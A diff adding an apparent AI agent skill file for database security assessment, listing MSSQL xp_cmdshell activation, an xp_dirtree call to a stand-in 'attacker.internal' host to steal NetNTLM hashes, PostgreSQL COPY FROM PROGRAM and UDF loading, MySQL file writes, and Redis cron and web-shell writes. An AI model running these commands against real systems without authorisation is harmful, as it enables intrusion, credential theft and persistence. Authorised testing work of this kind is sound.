@@ -1,0 +1,82 @@
+schema_version: 1
+version: 3.0.0
+name: database-security
+description: Senior database engine and DBMS security assessment — MSSQL xp_cmdshell and linked servers, PostgreSQL COPY PROGRAM, MySQL file operations, and Redis unauthenticated command execution.
+triggers:
+  - database security
+  - dbms
+  - mssql
+  - postgresql
+  - mysql
+  - redis
+  - xp_cmdshell
+  - linked servers
+  - copy from program
+  - load data infile
+tools:
+  - curl
+knowledge: |
+  Audit enterprise database management systems (DBMS), privilege escalation vectors, and database post-exploitation paths with senior offensive engineering precision.
+
+  1. MICROSOFT SQL SERVER (MSSQL) ASSESSMENT:
+     - Operating System Command Execution (`xp_cmdshell`):
+       Check if `xp_cmdshell` is enabled or can be activated by privileged database users:
+       `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
+       `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
+       `EXEC master..xp_cmdshell 'whoami';`
+     - SMB NTLM Hash Stealing (Out-of-Band UNC Paths):
+       Force MSSQL to initiate an outbound SMB connection to capture NetNTLM hashes without command execution:
+       `EXEC master..xp_dirtree '\\attacker.internal\share';`
+       `EXEC master..xp_fileexist '\\attacker.internal\share';`
+     - Linked Server Chaining:
+       Enumerate linked database servers: `EXEC sp_linkedservers;`
+       Execute queries across linked servers to escalate privileges:
+       `SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT SYSTEM_USER');`
+
+  2. POSTGRESQL ENGINE ASSESSMENT:
+     - Command Execution via `COPY ... FROM PROGRAM`:
+       Supported in PostgreSQL 9.3+ for superusers and members of `pg_execute_server_program`:
+       `CREATE TABLE cmd_exec(output text);`
+       `COPY cmd_exec FROM PROGRAM 'id';`
+       `SELECT * FROM cmd_exec;`
+     - Large Object File System Operations:
+       Read and write files on the database host using PostgreSQL large objects (`lo_import`, `lo_export`):
+       `SELECT lo_import('/etc/hosts', 1337);`
+       `SELECT lo_export(1337, '/tmp/hosts_dump');`
+     - Custom User-Defined Functions (C UDF):
+       Loading custom shared libraries (`.so`) into PostgreSQL to execute arbitrary code:
+       `CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/udf.so', 'sys_eval' LANGUAGE C STRICT;`
+
+  3. MYSQL / MARIADB ASSESSMENT:
+     - Arbitrary File Reading (`LOAD DATA LOCAL INFILE`):
+       When enabled on client and server, allows reading files from client or server filesystems:
+       `LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE temp_dump FIELDS TERMINATED BY '\n';`
+     - Arbitrary File Writing (`INTO OUTFILE`):
+       When `secure_file_priv` is empty or set to the web root:
+       `SELECT 'TEST_CANARY' INTO OUTFILE '/var/www/html/canary.txt';`
+     - UDF Dynamic Library Injection:
+       Writing compiled UDF binaries into the MySQL plugin directory (`@@plugin_dir`).
+
+  4. REDIS IN-MEMORY STORE ASSESSMENT:
+     Redis default configurations bind to 0.0.0.0 without authentication on port 6379:
+     - Unauthenticated Connection Probe:
+       `nc -nv <target_ip> 6379` -> Issue `INFO` or `CONFIG GET *`
+     - Scheduled Job (Cron) Overwrite (Linux):
+       `CONFIG SET dir /etc/cron.d/`
+       `CONFIG SET dbfilename backup_job`
+       `SET job "\n* * * * * root echo canary > /tmp/canary\n"`
+       `SAVE`
+     - Web Shell Writing:
+       `CONFIG SET dir /var/www/html/`
+       `CONFIG SET dbfilename shell.php`
+       `SET payload "<?php phpinfo(); ?>"`
+       `SAVE`
+
+  5. SAFE AUDITING STANDARDS:
+     - Limit queries to read-only version discovery (`SELECT @@version`, `SELECT version()`) and configuration audits (`sp_configure`, `SHOW VARIABLES`).
+     - Never alter production crontab directories or overwrite live database files.
+references:
+  - persona:database-security-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/database-security.yaml
